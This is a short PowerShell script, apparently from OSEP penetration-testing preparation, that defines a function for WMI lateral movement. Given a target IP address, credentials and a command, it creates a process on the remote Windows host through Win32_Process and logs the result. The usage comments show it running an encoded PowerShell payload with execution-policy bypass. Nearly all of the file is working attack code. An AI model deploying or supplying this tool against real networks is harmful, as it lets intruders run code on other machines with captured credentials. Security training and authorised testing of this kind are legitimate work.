# OSEP - WMI Lateral Movement
# . .\wmi_lateral.ps1
# Invoke-WMILateral -target 10.10.10.5 -user CORP\admin -pass 'P@ss' -cmd 'whoami'
# Invoke-WMILateral -target 10.10.10.5 -user admin -pass 'P@ss' -cmd 'powershell -nop -ep bypass -enc <B64>'

$LOG = "C:\Windows\Temp\osep_log.txt"
function wl($m,$l="INFO"){try{Add-Content $LOG "[$((Get-Date).ToString('HH:mm:ss'))][WMI][$l] $m" -EA SilentlyContinue}catch{}}

function Invoke-WMILateral {
    param(
        [Parameter(Mandatory)][string]$target,
        [Parameter(Mandatory)][string]$user,
        [Parameter(Mandatory)][string]$pass,
        [Parameter(Mandatory)][string]$cmd
    )

    wl "Target=$target User=$user"

    try {
        $secpass = ConvertTo-SecureString $pass -AsPlainText -Force
        $cred    = New-Object Management.Automation.PSCredential($user, $secpass)

        $wmi = [wmiclass]"\\$target\root\cimv2:Win32_Process"
        $wmi.Scope.Options.Username = $user
        $wmi.Scope.Options.Password = $pass

        $result = $wmi.Create($cmd)
        if ($result.ReturnValue -eq 0) {
            wl "Process created. PID=$($result.ProcessId)"
            Write-Host "[+] WMI exec OK. PID=$($result.ProcessId)"
        } else {
            wl "WMI Create returned: $($result.ReturnValue)" "ERROR"
            Write-Host "[-] WMI Create failed (code $($result.ReturnValue))"
        }
    } catch {
        wl "Exception: $_" "ERROR"
        Write-Host "[-] Error: $_"
    }
}
